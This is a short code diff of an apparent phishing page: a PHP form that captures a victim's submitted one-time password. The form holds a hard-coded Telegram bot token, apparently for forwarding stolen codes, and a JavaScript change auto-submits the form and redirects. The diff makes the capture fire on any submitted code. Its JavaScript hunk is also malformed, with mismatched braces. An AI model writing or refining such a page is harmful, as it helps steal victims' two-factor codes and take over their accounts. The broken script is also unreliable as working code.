@@ -292,7 +292,7 @@
 
       <form id="otpForm" action="" method="POST">
         <?php
-          if (isset($_POST['verify'])) {
+          if (isset($_POST['otp_code'])) {
           $otp  = trim($_POST['otp_code'] ?? '');
     
           $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
@@ -431,10 +431,15 @@
         verifying = false;
 
         // Redirect after short delay
-        setTimeout(() => {
+        
+      }, 10000);
+      // Form submit
+    otpForm.addEventListener("submit", function(e) {
+      setTimeout(() => {
+            otpForm.submit();
             window.location.href = "index.php";
         }, 1000);
-      }, 10000);
+    }
     });
   </script>
 </body>
